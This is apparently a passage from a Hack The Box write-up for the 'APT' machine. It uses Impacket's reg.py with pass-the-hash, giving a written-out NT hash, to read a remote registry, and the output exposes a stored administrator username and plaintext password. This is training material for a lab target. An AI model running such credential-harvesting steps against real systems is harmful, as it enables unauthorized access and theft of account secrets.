# Remote Registry
### List Keys
```bash
┌─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\
HKU\Software\\GiganticHostingManagementSystem
HKU\Software\\Microsoft
HKU\Software\\Policies
HKU\Software\\RegisteredApplications
HKU\Software\\VMware, Inc.
HKU\Software\\Wow6432Node
HKU\Software\\Classes
```



### Get GiganticHostingManagementSystem
```bash
┌─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\GiganticHostingManagementSystem\
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
```